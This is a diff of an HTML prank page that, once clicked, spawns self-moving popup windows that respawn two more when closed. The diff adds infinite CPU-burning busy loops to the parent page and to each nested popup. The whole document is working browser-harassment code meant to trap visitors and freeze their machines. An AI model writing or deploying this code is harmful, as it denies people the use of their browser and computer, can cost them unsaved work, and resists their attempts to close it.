@@ -1,36 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>😂 You Are Doomed!</title>
+    <title>😂 You Are Trapped!</title>
     <script>
         function spawnPopup() {
             let x = Math.random() * screen.width;
             let y = Math.random() * screen.height;
-
+            
             let w = window.open("", "", `width=300,height=200,left=${x},top=${y}`);
+            
             if (w) {
-                w.document.write("<h1>You Can't Escape! 😈</h1>");
                 w.document.write(`
+                    <h1 style="color:red;">YOU CAN'T ESCAPE! 😈</h1>
                     <script>
                         function spawnPopup() {
                             let x = Math.random() * screen.width;
                             let y = Math.random() * screen.height;
                             let win = window.open('', '', 'width=300,height=200,left=' + x + ',top=' + y);
                             if (win) {
-                                win.document.write('<h1>You Are Doomed! 😂</h1>');
-                                win.document.write('<script>window.onbeforeunload = function() { opener.spawnPopup(); opener.spawnPopup(); }; setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 100);</scr' + 'ipt>');
+                                win.document.write('<h1 style="color:red;">MORE CHAOS! 😂</h1>');
+                                win.document.write('<script>window.onbeforeunload = function() { opener.spawnPopup(); opener.spawnPopup(); }; setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 50); setInterval(() => { let n = 0; while(n < 1000000000) { n++; } }, 10);</scr' + 'ipt>');
                             }
                         }
                         window.onbeforeunload = function() { spawnPopup(); spawnPopup(); };
-                        setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 100);
+                        setInterval(() => { let x = Math.random() * screen.width; let y = Math.random() * screen.height; window.moveTo(x, y); }, 50);
+                        setInterval(() => { let n = 0; while(n < 1000000000) { n++; } }, 10);
                     <\/script>
                 `);
 
                 setInterval(() => {
-                    x += (Math.random() * 200 - 100);
-                    y += (Math.random() * 200 - 100);
+                    x += (Math.random() * 500 - 250);
+                    y += (Math.random() * 500 - 250);
                     w.moveTo(x, y);
-                }, 100);
+                }, 50);
+
+                // Useless CPU waste
+                setInterval(() => {
+                    let n = 0;
+                    while (n < 1000000000) { n++; }
+                }, 10);
             }
         }
 
@@ -47,7 +55,7 @@
     </script>
 </head>
 <body>
-    <h1>Click anywhere to unleash chaos...</h1>
+    <h1>Click anywhere to start the madness...</h1>
     <script>
         document.body.onclick = startMadness;
     </script>
